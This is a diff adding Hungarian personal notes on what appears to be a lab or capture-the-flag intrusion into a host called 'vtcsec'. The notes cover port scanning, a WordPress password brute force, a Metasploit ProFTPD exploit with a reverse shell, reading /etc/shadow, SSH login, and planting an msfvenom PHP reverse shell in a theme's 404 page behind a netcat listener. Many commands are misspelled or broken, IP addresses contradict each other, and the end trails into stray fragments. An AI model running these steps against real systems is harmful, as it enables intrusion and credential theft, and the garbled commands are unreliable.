@@ -1,0 +1,48 @@
+sudo bash
+nmap 40.0.8.13
+tap 40.0.8.13 p21,22,50-sV (ezek aportok voltak ez nap-on)
+dirb http://40.0.8.13/
+a vtsec web donaint át kell írni az ip ciare a böngészőben
+vi /etc/hosts (ide be kéne írni az ip cimet (40.0.8.13 vtctec) 
+wpscan-url http://vtcsec/secret/usernames admin --passwords /usr/share/wordlists/rockyou.txt (csak valami miatt nemjó a wpscan)
+itt admin admin a név és jelszó
+
+exploit-db.com-on valamit kell csinálni
+másik terminalban
+	ugyanez az nap (map 40.0.8.13 p21,22,88-SV) asfconsole
+	azon belül
+	search proftpd
+	use 5 (sorszámot is lehet használni)
+	rhost 48.0.8.13
+	set payload cad/unix/reverse
+	options
+	set host 30.0.1.14
+	run
+		Is
+		Id (rendszergazdák vagyunk)
+valahogy ki lett deritve runon belül valmal cat /etc/shadow/valamivel, hogy marlinspike a név is meg Jelszó Is
+
+3. terminal
+			ssh marlinspike@40.0.8.13
+			yes
+			marlinspike Jelszó beírása
+odlalon Themes/Editor ott epdig a 404-et átírni
+
+4. terminal
+				sudo bash
+				msfvenom -l payload | grep php | grep reverse
+				msfvenow -p php/reverse.php
+a tartalmát a 404 cucc helyére berakni
+a portot benne étiral 3333-ra
+	quit
+	msfconsole
+	nc-lvmp 3333
+	search openssl
+	use 11
+	set lhost 30.0.1.14 quit
+ez a gép any
+_______________________________________________
+40.0.11.13
+burpsuiteot kell használni
+лос
+1
